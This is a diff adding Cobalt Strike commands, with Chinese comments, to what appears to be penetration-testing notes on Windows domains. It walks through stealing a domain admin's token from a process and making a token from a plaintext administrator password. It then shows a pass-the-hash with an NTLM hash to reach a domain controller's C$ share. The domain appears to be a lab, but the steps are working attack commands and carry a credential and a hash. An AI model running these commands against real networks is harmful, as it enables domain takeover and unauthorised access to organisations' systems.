@@ -37,6 +37,20 @@ beacon> net dclist
 - sharphound 查看收集的信息, cs偷个token, 或 Inject进程, 再执行
 - [域用户枚举_爆破-kerberos](#域用户枚举_爆破-kerberos)
 
+```sh
+# cs
+ps # 查看进程找到域管理员的进程
+steal_token 1400 # GUI操作也可
+shell dir \\OWA\C$
+# 清除 token 后就无法访问域控主机
+rev2self #还原进程
+shell dir \\OWA\C$ # 提示无权限
+# 域管凭证制作Token
+make_token GOD\Administrator mac1234!
+shell dir \\OWA\C$ # 成功访问域控
+pth GOD\Administrator e97afaff5812d7cc281147091ebb4dc7 # 域管理员哈希传递, 然后访问域控
+```
+
 ## 域维护命令
 
 ```sh
